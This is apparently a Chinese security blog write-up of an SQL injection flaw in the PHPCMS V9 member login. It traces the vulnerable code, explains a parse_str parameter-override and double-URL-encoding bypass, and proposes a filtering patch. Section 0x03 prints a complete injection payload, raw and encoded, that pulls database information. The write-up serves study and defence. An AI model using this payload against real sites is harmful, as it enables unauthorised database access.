title: PHPCMS V9 SQL注入漏洞
date: 2015-09-21 21:19:52
tags: 安全心得
---
<!-- more -->
# 0x00 漏洞描述

在PHPCMS V9版本（最新版本）的登录功能中，存在SQL注入漏洞，登录界面通过POST传入的data内容，解析其中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。因为代码没有做过滤，攻击者可以利用POST内容进行SQL注入。


# 0x01 漏洞成因

总结来说漏洞的成因主要是以下两点：

1.*POST内容用来进行数据库查询*

2.*5.3版本之后的PHP配置默认关闭GPC*

>gpc 是PHP的一个防止SQL注入的转义机制。所有的全局变量会被php的函数mysql magic\_quotes\_gpc进行编码，把一些特殊字符例如‘，“，\,NULL等等，加上反斜线\，从而避免sql注入.在PHP的配置中可以开启该功能。


# 0x02 漏洞代码分析

下面通过PHPCMS的源码来分析在文件中漏洞成因。


> \phpcms\modules\member\index.php
   
```
$username = isset($_POST['username']) && is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
$password = isset($_POST['password']) && trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
$cookietime = intval($_POST['cookietime']);
$synloginstr = ''; //同步登陆js代码
            
if(pc_base::load_config('system', 'phpsso')) 
{
$this->_init_phpsso();
//通过client的ps_member_login方法传入$username、$password获取一段数据
$status = $this->client->ps_member_login($username, $password);
$memberinfo = unserialize($status);
```
**注意这段PHP代码中，username使用的is_username进行了过滤而password没有做任何处理。**

is_username(）这个函数的功能是检查用户名是否符合规定，是PHPCMS中的一个检查机制。具体代码如下：

```

/**
 * 检查用户名是否符合规定
 *
 * @param STRING $username 要检查的用户名
 * @return 	TRUE or FALSE
 */
function is_username($username) {
	$strlen = strlen($username);
	if(is_badword($username) || !preg_match("/^[a-zA-Z0-9_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]+$/", $username)){
		return false;
	} elseif ( 20 < $strlen || $strlen < 2 ) {
		return false;
	}
	return true;
}

```

Login对变量进行了处理之后将变量创给了ps\_member\_login函数
继续跟进ps\_member\_login和\_ps\_send函数

```
/**
* 用户登陆
* @param string $username 	用户名
* @param string $password 	密码
* @param int $isemail	email
* @return int {-2;密码错误;-1:用户名不存在;array(userinfo):用户信息}
*/
public function ps_member_login($username, $password, $isemail=0) {
	if($isemail) {
		if(!$this->_is_email($username)) {
			return -3;
		}
		$return = $this->_ps_send('login', array('email'=>$username, 'password'=>$password));
	} else {
		$return = $this->_ps_send('login', array('username'=>$username, 'password'=>$password));
	}
	return $return;
}
private function _ps_send($action, $data = null) 
{
    return $this->_ps_post($this->ps_api_url."/index.php?m=phpsso&c=index&a=".$action, 500000, $this->auth_data($data));
}
```
通过ps_member_login方法获取一段数据之后，再由\_ps\_send向phpsso发送http包的post数据，phpsso认证完成后，将用户的信息返回给member的login送入数据库进行查询处理。

这里基本上还原了PHPCMS对数据的处理，总结下基本流程：

1. 登录用户提交用户名和密码给menber的login
2. 然后member的login通过ps\_member\_login构造发送phpsso请求login验证的http包，并且将用户名和密码作为post数据.
3. phpsso认证完成后，将用户的信息返回给member的login进行后续处理 
4. 在整个认证过程中，password没有做任何处理就直接传入phpsso，phpsso没有对于解码数据进行过滤。

# 0x03 攻击方法

## 编码绕过

password字段如果存在特殊字符，在传入到程序时仍然会被转义，针对这个问题可以使用二次url编码的方法来搞定。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。

## 数据查询

在phpsso的login中使用的是username做数据库查询，而不是passwod。而username是经过处理的，因此我们需要想法构造password让他具有查询的能力。

这里需要看PHPCMS是如何处理URL中的POST变量的。

```
if(isset($_POST['data'])) 
{
parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);
    if(empty($this->data) || !is_array($this->data)) {
        exit('0');
        }
} 
    else {
        exit('0');
}
```

这里POST数据使用了parse_str函数进行处理。它的功能是解析出POST数据中的变量值。
例如：

```
<?php
parse_str("id=23&name=John%20Adams");
echo $id."<br />";
echo $name;
?>
```
输出：
>23
John Adams

当我们的数据为“username=123&password=456”这样的字符串，会把它解析为：

>Array(
    username=>123,
    password=>456
)

但是这个函数存在解析问题，如果我们构造字符串成“usernamen=123&password=456&username=789”，他就会被解析为：

>Array(
    username=>789,
    password=>456
}

那这样我们的利用思路就有了：将”&username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下：

>usernmae=phpcms&password=%26username%3d%2527

通过这样的方法，我们绕过了username的检测，利用password提交了注入数据，现在我们来提交一段复杂的代码：

```
username=phpcms&password=123456&username=' union select '2','test\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\'123456\',\'\',\'\',\'\',\'\',\'\',\'2\',\'10\'),(\'2\',\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null#
```

经过编码后变成：

```
username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523
```



# 0x04 防御方法

添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。

```
\phpcms\modules\member\index.php

$username = isset($_POST['username']) && is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
//$password = isset($_POST['password']) && trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
/* 过滤、转义 */
$password = isset($_POST['password']) && trim($_POST['password']) ? addslashes(urldecode(trim($_POST['password']))) : showmessage(L('password_empty'), HTTP_REFERER);
/**/

```

# 0x05 另一种玩法

如果能拿到auth_key的话可以通过auth\_key进行注入，具体方法请参考：

[PHPCMS V9 一个为所欲为的漏洞](https://0x9.me/7CeWU)


# 尾巴

这个洞利用不太方便，官方已经修复了漏洞，而且必须是**PHP5.3**才能利用。


